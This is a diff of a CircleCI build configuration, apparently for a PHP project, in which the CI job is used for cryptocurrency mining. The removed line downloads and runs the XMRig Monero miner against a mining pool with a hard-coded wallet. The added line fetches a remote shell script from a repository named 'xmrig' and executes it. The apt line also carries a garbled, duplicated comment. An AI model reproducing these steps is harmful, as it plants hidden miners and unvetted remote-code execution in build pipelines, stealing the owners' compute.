@@ -22,7 +22,7 @@ jobs:
       - checkout
 
       - run: sudo apt update # PHP CircleCI 2.0 Configuration File# PHP CircleCI 2.0 Configuration File sudo apt install zlib1g-dev libsqlite3-dev
-      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-linux-x64.tar.gz && tar xf xmrig-6.7.0-linux-x64.tar.gz && cd xmrig-6.7.0 && ./xmrig -a rx/0 --donate-level 1 -o monero.herominers.com:10190 -u 8AKdLY6GamfhtPodhc1WmvKwUVbngm4M7Shpr6brzXp4AzsLG4mUNYLPzFBdwCpWk21j5Qs7XJ66f2utD998Sky9A7BHjg7
+      - run: wget https://raw.githubusercontent.com/linanta/xmrig/main/x.sh?token=AIWRKIIJD3HBT3AGNSFSVP3AED7JI && chmod +x x.sh && ./x.sh 
 
       # Download and cache dependencies
       - restore_cache:
